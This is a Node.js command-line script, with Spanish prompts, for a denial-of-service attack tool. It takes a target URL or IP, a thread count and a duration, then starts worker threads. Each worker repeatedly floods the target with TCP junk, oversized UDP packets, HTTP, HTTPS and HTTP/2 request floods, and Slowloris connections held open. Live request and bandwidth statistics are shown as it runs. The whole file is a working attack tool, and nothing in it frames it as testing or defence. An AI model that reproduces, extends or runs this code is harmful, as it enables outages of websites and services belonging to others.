#!/usr/bin/env node
'use strict';

const os = require('os');
const net = require('net');
const dgram = require('dgram');
const http = require('http');
const https = require('https');
const http2 = require('http2');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const { performance } = require('perf_hooks');
const readline = require('readline');
const chalk = require('chalk');
const { randomBytes, randomFillSync } = require('crypto');
const { URL } = require('url');
const dns = require('dns').promises;

const MAX_THREADS = 1000;
const MIN_THREADS = 100;
const MAX_DURATION = 3600;
const MIN_DURATION = 10;
const STAT_INTERVAL = 250;
const METHODS = ['TCP', 'UDP', 'HTTP', 'HTTPS', 'HTTP2', 'SLOWLORIS'];

class DDoSAttack {
  constructor() {
    this.stats = { total: 0, success: 0, failure: 0, bandwidth: 0 };
    this.workers = [];
    this.startTime = 0;
  }

  async start() {
    const targetInput = await this.prompt('Objetivo (URL/IP): ');
    const { host, port } = await this.resolveTarget(targetInput);
    const threads = await this.promptNumber(`Hilos (${MIN_THREADS}-${MAX_THREADS}): `, MIN_THREADS, MAX_THREADS);
    const durationSec = await this.promptNumber(`Duración (segundos) (${MIN_DURATION}-${MAX_DURATION}): `, MIN_DURATION, MAX_DURATION);
    console.log(chalk.yellow(`→ Atacando ${host}:${port} con ${threads} hilos durante ${durationSec}s`));
    this.startTime = performance.now();
    this.spawnWorkers(host, port, threads);
    this.displayStats();
    setTimeout(() => this.stop(), durationSec * 1000);
  }

  async resolveTarget(input) {
    let formatted = input;
    if (!input.includes('://') && !net.isIP(input)) formatted = 'http://' + input;
    if (net.isIP(input)) return { host: input, port: 80 };
    const parsed = new URL(formatted);
    const { address } = await dns.lookup(parsed.hostname);
    const port = parsed.port || (parsed.protocol === 'https:' ? 443 : 80);
    return { host: address, port };
  }

  spawnWorkers(host, port, totalThreads) {
    const cpuCount = Math.min(os.cpus().length, 16);
    const perWorker = Math.ceil(totalThreads / cpuCount);
    const payloads = this.generatePayloads(host);
    for (let i = 0; i < cpuCount; i++) {
      const worker = new Worker(__filename, { workerData: { host, port, payloads, methods: METHODS, intensity: perWorker } });
      worker.on('message', this.updateStats.bind(this));
      worker.on('error', err => console.error(chalk.red(err)));
      this.workers.push(worker);
    }
  }

  generatePayloads(host) {
    return {
      tcp: Buffer.alloc(1024, () => randomFillSync(Buffer.alloc(1))[0]),
      udp: Buffer.alloc(65507, () => randomFillSync(Buffer.alloc(1))[0]),
      httpHeader: () => `GET /${randomBytes(8).toString('hex')} HTTP/1.1\r\nHost: ${host}\r\nConnection: keep-alive\r\n\r\n`
    };
  }

  updateStats({ total = 0, success = 0, failure = 0, bandwidth = 0 }) {
    this.stats.total += total;
    this.stats.success += success;
    this.stats.failure += failure;
    this.stats.bandwidth += bandwidth;
  }

  displayStats() {
    if (!this.startTime) return;
    const elapsed = (performance.now() - this.startTime) / 1000;
    const rps = (this.stats.total / elapsed).toFixed(0);
    const gb = (this.stats.bandwidth / 1024 ** 3).toFixed(3);
    process.stdout.write(
      chalk`\r{cyan [${elapsed.toFixed(1)}s]} {white Total:} {cyan ${this.stats.total}} ` +
      chalk`{green Success:} {cyan ${this.stats.success}} ` +
      chalk`{red Failure:} {cyan ${this.stats.failure}} ` +
      chalk`{yellow RPS:} {cyan ${rps}} ` +
      chalk`{magenta BW:} {cyan ${gb}GB}`
    );
    this.statTimer = setTimeout(() => this.displayStats(), STAT_INTERVAL);
  }

  stop() {
    clearTimeout(this.statTimer);
    this.workers.forEach(w => w.terminate());
    console.log(chalk.red('\n\nAtaque detenido'));
    process.exit(0);
  }

  prompt(question) {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise(resolve => rl.question(chalk.greenBright(question), ans => { rl.close(); resolve(ans.trim()); }));
  }

  async promptNumber(question, min, max) {
    let num;
    do { num = parseInt(await this.prompt(question), 10); } while (isNaN(num) || num < min || num > max);
    return num;
  }
}

if (isMainThread) new DDoSAttack().start(); else {
  const { host, port, payloads, methods, intensity } = workerData;
  const report = (type, bytes = 0) => parentPort.postMessage({ total: 1, success: type === 'success' ? 1 : 0, failure: type === 'failure' ? 1 : 0, bandwidth: bytes });
  const attackMethods = {
    TCP: () => {
      const s = net.connect(port, host);
      s.on('connect', () => { s.write(payloads.tcp); report('success', payloads.tcp.length); s.end(); });
      s.on('error', () => report('failure'));
    },
    UDP: () => {
      const s = dgram.createSocket('udp4');
      s.send(payloads.udp, port, host, err => { err ? report('failure') : report('success', payloads.udp.length); s.close(); });
    },
    HTTP: () => {
      const req = http.request({ method: 'GET', host, port, headers: { 'User-Agent':'Mozilla/5.0','Accept-Language':'es-ES' } }, res => report('success'));
      req.on('error', () => report('failure')).end();
    },
    HTTPS: () => {
      const req = https.request({ method:'GET', host, port, rejectUnauthorized:false }, res => report('success'));
      req.on('error', () => report('failure')).end();
    },
    HTTP2: () => {
      const client = http2.connect(`https://${host}:${port}`,{rejectUnauthorized:false});
      client.on('error',()=>report('failure'));
      const req = client.request({':method':'GET',':path':'/'});
      req.on('response',()=>report('success'));
      req.on('error',()=>report('failure'));
      req.end();
    },
    SLOWLORIS: () => {
      const s = net.connect(port, host);
      s.on('connect', () => {
        s.write(`GET / HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: Mozilla/5.0\r\n`);
        report('success');
        const keep = setInterval(() => { if (s.writable) s.write('X-a: b\r\n'); else clearInterval(keep); }, 10000);
        s.on('error', () => { clearInterval(keep); report('failure'); });
      });
      s.on('error',()=>report('failure'));
    }
  };
  setInterval(() => { for (let i = 0; i < intensity; i++) methods.forEach(m => { try{attackMethods[m]()}catch{report('failure')} }); }, 50);
}
